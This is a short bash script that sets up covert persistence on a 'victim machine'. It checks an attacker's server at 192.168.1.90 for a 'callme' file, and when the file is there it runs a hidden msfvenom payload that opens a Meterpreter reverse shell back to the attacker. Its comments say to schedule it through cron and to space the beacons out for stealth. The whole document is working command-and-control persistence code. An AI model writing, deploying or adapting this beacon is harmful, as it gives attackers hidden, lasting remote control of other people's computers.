#!/bin/bash
# this script is designed to provide some form of persistance on a victim machine. It relies on the attacker leaving
# bread crumbs, and the victim computer making an occasional call to a C2 server.  If the "key" bread crumb exists then
# it makes a call to the attackers machine with a meterpreter shell.  The key in this case is a file titled "callme"
# If the files exists then the victim machine will try to reconnect to the attacker machine by running a msf venom
# payload that calls home. This payload will be hidden deep in a low privaliged uses directory.
# be sure to replace the IP with the correct address.  A domain name could also be used if desired.


status=$(curl -I --silent http://192.168.1.90:8000/callme | head -n 1 | awk -F " " '{print $2}')

if [[ $status == "200" ]];
     then
     	# execute some payload that will call home
     		./coming_home.elf ## append the obsured filed path to the beginning of this script
fi

exit

# create a cron job in the users cron tab that will run this script every so often.
# that way if the connection is lost it will not be down for long.  Though if you would like to make this even more stealthy, spacing the "call-homes" out even more would be a good idea.
# But for demo purposes we will keep it short.
